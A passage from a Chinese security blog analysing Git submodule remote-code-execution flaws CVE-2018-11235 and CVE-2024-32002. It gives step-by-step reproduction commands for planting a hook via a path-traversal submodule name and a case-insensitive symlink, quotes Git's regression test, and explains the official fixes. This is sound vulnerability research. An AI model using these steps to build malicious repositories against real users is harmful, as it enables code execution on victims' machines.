<p>这里我们<a href="https://github.com/j4k0m/CVE-2018-11235/blob/main/exploit.sh">参考的攻击脚本中</a>，由于涉及两个repo的操作（利用第二个repo触发漏洞），它将其中一个(evil)repo中的<code>.git</code>改向了伪造后的<code>fake_dir/modules/submod/.git</code>，主要是为了保证<code>git commit</code>能够工作，从而让提交能够成功。我们这边就完全按照它的exp来模拟整个攻击：</p>
<ol>
<li>
<p>创建一个<code>fakegit</code>目录作为伪造的文件夹，同时为了保持git的目录结构，其内容一定要为：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">fake_dir/modules
</code></pre><p>这里的<code>submod</code>为之后将要进行clone操作的<code>submodule_path</code>。</p>
</li>
<li>
<p>添加两个准备用于触发的子模块，第一个用于布置漏洞，第二个用于触发hook：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">git submodule add https://github.com/staaldraad/repository.git submod
git submodule add https://github.com/staaldraad/repository.git aaa
</code></pre><p>其中<code>submod</code>和<code>aaa</code>即为之前提到的<code>submodule_path</code></p>
</li>
<li>
<p>将此时生成好的<code>.git/modules/submod</code>拷贝到<code>fakegit/modules/submod</code>：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">mv .git/modules/submod fakegit/modules/submod
</code></pre><p>并且创建有效的钩子（例子中挑选的为<code>post-checkout</code>）：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">cat &gt; fakegit/modules/submod/hooks/post-checkout &lt;&lt;EOF
#!/bin/sh

echo &#34;PWNED&#34;
ping -c 3 127.0.0.1

exit 0
EOF

chmod +x fakegit/modules/submod/hooks/post-checkout
</code></pre></li>
<li>
<p><strong>漏洞点</strong> 修改<code>.gitmodule</code>，将其中的<code>submodule.name</code>由<code>submod</code>改为<code>../../fakegit/modules/submod</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sed -i <span style="color:#e6db74">&#39;0,/submod/{s/&#34;submod/&#34;\.\.\/\.\.\/fakegit\/modules\/submod/}&#39;</span> .gitmodules
</span></span></code></pre></div><p>之后，git将会将<code>fakegit/modules/submod</code>视为<code>.git/modules/submod</code>，从而方便我们劫持。</p>
<ul>
<li>为了保障git的一致性，修改<code>fakegit/.git</code>中的内容，使其指向<code>fakegit/modules/submod</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sed -i <span style="color:#e6db74">&#39;s/\.git/fakegit/&#39;</span> submod/.git
</span></span></code></pre></div><p>这样就会彻底骗过git的操作，让其以为<code>fakegit/modules/submod</code>为真正的子目录。</p>
</li>
<li>
<p>提交修改，commit，完成所有操作</p>
</li>
<li>
<p>当受害者尝试拷贝git repo内容的时候，最终会因为识别到错误的目录，最终触发对应的<code>post-checkout</code>文件，实现RCE。</p>
<p>至此，完成整个攻击流程：</p>
<p><img loading="lazy" src="/attachments/2024-07-31-git/10fdc958-3d2b-41cf-bdcd-2216c1c65871.png" alt=""  />
</p>
</li>
</ol>
<h4 id="312-修复策略">3.1.2 修复策略<a hidden class="anchor" aria-hidden="true" href="#312-修复策略">#</a></h4>
<p>官方给出了<a href="https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44">相关的修复策略</a></p>
<p><img loading="lazy" src="/attachments/2024-07-31-git/b4cc2b31-8813-4af5-a532-21b65a262d55.png" alt=""  />
</p>
<p><img loading="lazy" src="/attachments/2024-07-31-git/4031d2b0-1a8c-4ec8-8b94-78ea46671ae8.png" alt=""  />
</p>
<p>程序会检测这个<code>submodule</code>的路径，确认其是否是一个<code>../</code>等有害路径，防止路径穿越。</p>
<h3 id="32-cve-2024-32002">3.2 CVE-2024-32002<a hidden class="anchor" aria-hidden="true" href="#32-cve-2024-32002">#</a></h3>
<p>在时隔六年后，<code>submodule</code>再次出现了类似的漏洞，这一次其影响范围相较之前变小了不少，这次它只影响 Windows 和 Mac 操作系统。</p>
<p>这次的漏洞<strong>依然发生在git clone</strong>阶段，并且同样是操作<code>submodule</code>模块。利用方式和之前类似，不过这次<strong>通过劫持.git目录</strong>，从而导致文件写入的发生。</p>
<h4 id="321-漏洞成因">3.2.1 漏洞成因<a hidden class="anchor" aria-hidden="true" href="#321-漏洞成因">#</a></h4>
<p>Windows或者MacOS操作系统不同于Linux，其默认情况下<strong>大小写不敏感</strong>，如果在<code>submodule</code>的拷贝过程中，我们能够塞入一个<strong>符号链接</strong>，<strong>将.git目录被同名符号链接覆盖</strong>，此时子模块写入数据的时候，<strong>全部都将写入.git目录中</strong>，最后就能配合hook脚本完成攻击。</p>
<h4 id="322-漏洞复现">3.2.2 漏洞复现<a hidden class="anchor" aria-hidden="true" href="#322-漏洞复现">#</a></h4>
<p>漏洞复现的时候，需要进行如下的配置才能生效：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Set Git configuration options</span>
</span></span><span style="display:flex;"><span>$ git config --global protocol.file.allow always
</span></span><span style="display:flex;"><span>$ git config --global core.symlinks true
</span></span><span style="display:flex;"><span><span style="color:#75715e"># optional, but I added it to avoid the warning message</span>
</span></span><span style="display:flex;"><span>$ git config --global init.defaultBranch main 
</span></span></code></pre></div><p>同时，这个漏洞的影响力并不是特别大，因为Windows的符号链接创建需要使用管理员权限，所以如果尝试复现的时候，git必须要获得管理员权限。</p>
<p>这个漏洞git的官方仓库中给了测试用例，用来检测漏洞是否存在：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">test_expect_success CASE_INSENSITIVE_FS,SYMLINKS \
    &#39;submodule paths must not follow symlinks&#39; &#39;
    # This is only needed because we want to run this in a self-contained
    # test without having to spin up an HTTP server; However, it would not
    # be needed in a real-world scenario where the submodule is simply
    # hosted on a public site.
    test_config_global protocol.file.allow always &amp;&amp;
    # Make sure that Git tries to use symlinks on Windows
    test_config_global core.symlinks true &amp;&amp;
    tell_tale_path=&#34;$PWD/tell.tale&#34; &amp;&amp;
    git init hook &amp;&amp;
    (
        cd hook &amp;&amp;
        mkdir -p y/hooks &amp;&amp;
        write_script y/hooks/post-checkout &lt;&lt;-EOF &amp;&amp;
        echo HOOK-RUN &gt;&amp;2
        echo hook-run &gt;&#34;$tell_tale_path&#34;
        EOF
        git add y/hooks/post-checkout &amp;&amp;
        test_tick &amp;&amp;
        git commit -m post-checkout
    ) &amp;&amp;
    hook_repo_path=&#34;$(pwd)/hook&#34; &amp;&amp;
    git init captain &amp;&amp;
    (
        cd captain &amp;&amp;
        git submodule add --name x/y &#34;$hook_repo_path&#34; A/modules/x &amp;&amp;
        test_tick &amp;&amp;
        git commit -m add-submodule &amp;&amp;
        printf .git &gt;dotgit.txt &amp;&amp;
        git hash-object -w --stdin &lt;dotgit.txt &gt;dot-git.hash &amp;&amp;
        printf &#34;120000 %s 0\ta\n&#34; &#34;$(cat dot-git.hash)&#34; &gt;index.info &amp;&amp;
        git update-index --index-info &lt;index.info &amp;&amp;
        test_tick &amp;&amp;
        git commit -m add-symlink
    ) &amp;&amp;
    test_path_is_missing &#34;$tell_tale_path&#34; &amp;&amp;
    test_must_fail git clone --recursive captain hooked 2&gt;err &amp;&amp;
    grep &#34;directory not empty&#34; err &amp;&amp;
    test_path_is_missing &#34;$tell_tale_path&#34;
&#39;
</code></pre><p>脚本的前半段添加一个叫做<code>hook</code>的仓库，这个仓库添加完以后目录结构如下：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.
└── y
    └── hooks
        └── post-checkout
</code></pre><p>这里会注意到一个很有趣的现象，这个路径<strong>有意的在模仿.git</strong>的目录结构，尤其是<code>hooks/post-checkout</code>，当然，由于这个脚本本身并未放在本仓库的<code>.git</code>目录中，当这个仓库被clone的时候<strong>脚本并不会被触发</strong>。</p>
<p>后半段为漏洞的主要成因，其首先创建了一个叫做<code>captain</code>的仓库，然后调用了这个指令：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git submodule add --name x/y <span style="color:#e6db74">&#34;</span>$hook_repo_path<span style="color:#e6db74">&#34;</span> A/modules/x 
</span></span></code></pre></div><p>此处<code>submodule</code>相关的三个参数对应的值：</p>
<ul>
<li><code>&lt;name&gt;</code>:<code>x/y</code></li>
<li><code>&lt;submodule_repo&gt;</code>:<code>$hook_repo_path</code></li>
<li><code>&lt;submodule_path&gt;</code>:<code>A/modules/x</code></li>
</ul>
<p>当调用这个指令之后，git会做如下的事情：</p>
<ul>
<li>在<code>captain</code>目录中创建一个叫做<code>A/modules/x</code>的子目录，这个目录将会存放来自<code>&quot;$hook_repo_path&quot;</code>(也就是前面添加的hook仓库)中的所有内容；</li>
<li>上述步骤中，拷贝到<code>captain</code>仓库的<code>hook</code>仓库中的<code>.git</code>文件被替换成符号链接，指向<code>../../../.git/modules/x/y</code>，也就是<code>&lt;target_repo&gt;/.git/modules/&lt;name&gt;</code>的路径，这里会存放真正的<code>hook</code>的<code>.git</code>目录；</li>
<li>在<code>captain</code>的<code>.git</code>目录中的<code>modules</code>目录下，创建<code>x/y</code>目录，并且往其中拷贝所有的<code>hooks/.git</code>的内容；</li>
<li>创建<code>.gitmodule</code>目录。</li>
</ul>
<p>此时，<code>captain</code>中比较重要的文件结构如下：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.
├── .git
│   ├── HEAD
│   ├── config
│   ├── description
│   ├── index
│   ├── info
│   │   └── exclude
│   ├── modules
│   │   └── x           // 这里添加了路径x/y
│   │       └── y
│   │           └── HEAD

├── .gitmodules
└── A                  // 这里添加了A/modules/x
    └── modules
        └── x
            ├── .git
            └── y     // 目录里面自带y目录
                └── hooks
                    └── post-checkout
</code></pre><p>让我们把几个关键目录罗列以下：</p>
<ol>
<li>
<p>实际存放了<code>hook</code>仓库中<code>.git</code>的路径</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.git/modules/x/y
</code></pre></li>
<li>
<p>存放了被拷贝过来的<code>hook</code>仓库内容的路径：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">A/modules/x
</code></pre></li>
<li>
<p>从<code>captain</code>的视角上看，子模块<code>hook</code>仓库中存放<code>post-checkout</code>的路径：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">A/modules/x/y/hooks/post-checkout
</code></pre></li>
<li>
<p>从<code>captain</code>的视角上看，子模块<code>hook</code>仓库<code>.git</code>中hooks的路径为：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.git/modules/x/y/hooks/
</code></pre></li>
</ol>
<p>仔细看会发现，3和4的路径几乎只相差了<code>A</code>和<code>.git</code>部分，这就是这个漏洞攻击的一个前提。 在完成了布置之后，脚本会执行如下的逻辑：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ printf .git &gt;dotgit.txt <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>$ git hash-object -w --stdin &lt;dotgit.txt &gt;dot-git.hash <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>$ printf <span style="color:#e6db74">&#34;120000 %s 0\ta\n&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>cat dot-git.hash<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> &gt;index.info <span style="color:#f92672">&amp;&amp;</span>
</span></span></code></pre></div><p>这里利用了git的比较底层的指令，通过这个操作，能够将<code>a</code>作为一个符号链接文件添加到 Git 索引中，符号链接指向 .git。这个操作会存放在git的索引中，<strong>而不会直接在目录中存在</strong>。实际上，这样操作完之后，目录结构如下：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.
├── A
│   └── modules
│       └── x
│           └── y
│               └── hooks
│                   └── post-checkout
├── dot-git.hash
├── dotgit.txt
└── index.info
</code></pre><p>可以发现，这个<code>a</code>并不存在，但是在git的<strong>对象管理</strong>中，这个a作为一个对象存放了下来：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git cat-file -p 76d2a0138b
</span></span><span style="display:flex;"><span>tree ed6455916722fcf6cb5e03bf2602379f6237695f
</span></span><span style="display:flex;"><span>parent 2e5996a4ad5795e526a53a68bfa24ad11674ccbf
</span></span><span style="display:flex;"><span>author <span style="color:#ae81ff">1716626132</span> +0800
</span></span><span style="display:flex;"><span>committer  <span style="color:#ae81ff">1716626132</span> +0800
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>add-symlink
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ git cat-file -p ed64559167
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100644</span> blob ccf40c309e227b3ea61e3d3138af32774d5f994a    .gitmodules
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">040000</span> tree 41eaba36bec8946d145682993e3efc13877161fa    A
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">120000</span> blob 191381ee74dec49c89f99a62d055cb1058ba0de9    a
</span></span></code></pre></div><p>这就是这个攻击的<strong>隐蔽之处</strong>：整个攻击过程中，符号链接文件始终藏在<code>.git</code>的对象索引中，所以粗略一看是无法找到有问题的部分的。但是，当我们在对<code>captain</code>仓库进行clone的时候，这个符号链接<code>a</code>就会被释放出来。</p>
<p>最后执行：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git clone --recursive captain hooked 
</span></span></code></pre></div><p>就能实现最终的攻击。</p>
<p>此时，我们可以模拟一下整个攻击流程：</p>
<p>当我们在进行clone的时候，程序首先尝试将<code>captain</code>目录拷贝下来，执行<code>ed64559167</code>的操作，此时根据顺序，首先会创建这样的目录（tree）</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.
├── A
│
│
│
│
│
├── dot-git.hash
├── dotgit.txt
└── index.info
</code></pre><p>然后，git会紧接着创建符号链接<code>a</code>（Blob），此时由于<strong>大小写不敏感</strong>的特点，此时目录会变成：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.
├── a -&gt; .git
│
│
│
│
│
├── dot-git.hash
├── dotgit.txt
└── index.info
</code></pre><p>接下来，会尝试对<code>41eaba3</code>中的对象进行释放，整个对象指向的为：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">040000 tree a555b64513d2e0a23bca63e990b793927daafa43    modules
</code></pre><p>于是就会顺着我们之前<code>A</code>目录指向的内容一点点进行释放，此时的释放路径变为：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">A/modules/x/y/hooks/post-checkout
</code></pre><p>而由于<code>A</code>此时被<code>a</code>顶替，<code>a</code>指向了<code>.git</code>，所以此时释放的路径改变为：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.git/modules/x/y/hooks/post-checkout
</code></pre><p>于是，此时在我们的<code>captain</code>仓库中的<code>.git/modules/x/y/hooks/post-checkout</code>就成为了原本存放在<strong>hook目录中的一个脚本</strong>。而当完成了clone之后，最终<code>captain</code>目录中的<code>git</code>会尝试将<code>hook</code>的内容进行<code>checkout</code>操作，此操作最终就会诱发对应的<code>post-checkout</code>，导致脚本被执行！</p>
<h4 id="323-修复策略">3.2.3 修复策略<a hidden class="anchor" aria-hidden="true" href="#323-修复策略">#</a></h4>
<p>从git的<a href="https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d">官方修复</a>，中，可以看到引入了一个叫做<code>dir_contains_only_dotgit</code>的函数：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">dir_contains_only_dotgit</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>path)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    DIR <span style="color:#f92672">*</span>dir <span style="color:#f92672">=</span> opendir(path);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">dirent</span> <span style="color:#f92672">*</span>e;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>dir)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    e <span style="color:#f92672">=</span> readdir_skip_dot_and_dotdot(dir);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>e)
</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (strcmp(DEFAULT_GIT_DIR_ENVIRONMENT, e<span style="color:#f92672">-&gt;</span>d_name) <span style="color:#f92672">||</span>  <span style="color:#75715e">// 如果找到了非.git目录
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>         (e <span style="color:#f92672">=</span> readdir_skip_dot_and_dotdot(dir))) { <span style="color:#75715e">// 或者同时还存在另一个文件
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        error(<span style="color:#e6db74">&#34;unexpected item &#39;%s&#39; in &#39;%s&#39;&#34;</span>, e<span style="color:#f92672">-&gt;</span>d_name, path);
</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    closedir(dir);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">dirent</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">readdir_skip_dot_and_dotdot</span>(DIR <span style="color:#f92672">*</span>dirp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">dirent</span> <span style="color:#f92672">*</span>e;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ((e <span style="color:#f92672">=</span> readdir(dirp)) <span style="color:#f92672">!=</span> NULL) { <span style="color:#75715e">// 查找所有的目录
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>is_dot_or_dotdot(e<span style="color:#f92672">-&gt;</span>d_name)) <span style="color:#75715e">// 如果目录不是.或者..开头，则返回当前的e对象
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> e;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这个函数的作用为<strong>保证当前目录中仅包含.git目录</strong>这一个文件。之后程序还引入了如下的的修复：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">clone_submodule</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">module_clone_data</span> <span style="color:#f92672">*</span>clone_data,
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">string_list</span> <span style="color:#f92672">*</span>reference)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>file_exists(sm_gitdir)) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>   <span style="color:#66d9ef">if</span> (clone_data<span style="color:#f92672">-&gt;</span>require_init <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>stat(clone_data_path, <span style="color:#f92672">&amp;</span>st) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>       <span style="color:#f92672">!</span>is_empty_dir(clone_data_path))
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    die(_(<span style="color:#e6db74">&#34;directory not empty: &#39;%s&#39;&#34;</span>), clone_data_path);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/// ......
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>   <span style="color:#66d9ef">if</span> (clone_data<span style="color:#f92672">-&gt;</span>require_init <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>stat(clone_data_path, <span style="color:#f92672">&amp;</span>st) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>       <span style="color:#f92672">!</span>dir_contains_only_dotgit(clone_data_path)) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>       <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>dot_git <span style="color:#f92672">=</span> xstrfmt(<span style="color:#e6db74">&#34;%s/.git&#34;</span>, clone_data_path);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>       unlink(dot_git);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>       free(dot_git);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>       die(_(<span style="color:#e6db74">&#34;directory not empty: &#39;%s&#39;&#34;</span>), clone_data_path);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>   }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>此处的<code>clone_data_path</code>实际上为<code>&lt;target_repo&gt;/&lt;name&gt;</code> 可以看到，在<code>clone_submodule</code>阶段，程序会保证本地路径满足以下条件才会进行clone操作：</p>
<ul>
<li>当进行clone操作前，目的地址为空；</li>
<li>完成预备环境准备后(safe_create_leading_directories_const)和<code>submodule</code>的<code>clone</code>（但是不立即检出<code>check-out</code>工作目录中的文件）(run_command(&amp;cp))后，程序检查目标目录中是否仅包含<code>.git</code>文件。</li>
</ul>
<p>此时这里的submodule的clone操作实际上执行的。</p>
<blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git clone --no-checkout --progress --separate-git-dir &lt;target_repo&gt;/.git/modules/submodule --no-single-branch -- &lt;submodule_path&gt; &lt;target_repo&gt;/&lt;name&gt;
</span></span></code></pre></div><p>这个指令会将submodule的内容拷贝到根目录，但是不进行检出，也就是说此时 .git 中已经存放了 submodule 的 .git，但是还未发生检出(check-out)动作。</p>
</blockquote>
<p>实际上，指令执行的时候，会将<code>.git</code>中的内容放置在<code>.git/modules/x/y</code>这个路径下。</p>
<p>而根据我们之前的漏洞分析，<code>clone_data_path</code>，也就是<code>&lt;target_repo&gt;/&lt;name&gt;</code>，<code>target_repo/A/modules/x/</code>。如果未漏洞的影响下，此时的路径实际上是：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">/A/modules/x
</code></pre><p>那么此时<strong>就应该仅仅只有目标文件的.git文件</strong>。但是如果在漏洞印象下，此时的路径变为了：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.git/A/modules/x
</code></pre><p>而显然根据我们前文分析，在这个路径下会有一个叫做<code>y</code>的目录存在，因此能够被检测出来。即便我们在起名阶段进行了绕过，实际上这个攻击的过程中<strong>一定会往对应的路劲写入文件，因此仓库一定会影响到指定的目录</strong>。所以当前的修复其实是非常合理的。</p>
<h2 id="四总结">四、总结<a hidden class="anchor" aria-hidden="true" href="#四总结">#</a></h2>
<p>因为 git 大部分时候都是作为客户端软件存在，所以人们通常会无视其带来的影响，然而实际上正是这种疏忽，可能会引入更多的问题，尤其使用git的用户大多数都是拥有生产资料的开发者，这种漏洞带来的影响也许会比想象的严重。</p>
<p>git类的漏洞代表了非常典型的一种类型逻辑漏洞：较为复杂的功能之下容易掩盖一些被人们忽略的攻击面。在研究这个漏洞之前，笔者也未在意过这类工具底层实现的细节。在使用工具的时候，可以额外关注工具的实现细节，往往会发现一些意想不到的完全问题。</p>
<h2 id="五参考链接">五、参考链接<a hidden class="anchor" aria-hidden="true" href="#五参考链接">#</a></h2>
<p>1、<a href="https://www.zhaohuabing.com/post/2019-01-21-git/">Git内部存储原理</a></p>
<p>2、<a href="https://staaldraad.github.io/post/2018-06-03-cve-2018-11235-git-rce/">CVE-2018-11235 git RCE</a></p>


  </div>

  <footer class="post-footer">
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/blog/tiangongarticle042/">
    <span class="title">« 上一页</span>
    <br>
    <span>Scala代码审计之痛 -- Scala与Java的爱恨情仇</span>
  </a>
  <a class="next" href="http://localhost:1313/blog/tiangongarticle040/">
    <span class="title">下一页 »</span>
    <br>
    <span>JDBC Attack 与高版本 JDK 下的 JNDI Bypass</span>
  </a>
</nav>





  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>© <a href="https://poc.qianxin.com/home">天工实验室</a></span>
        

    
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
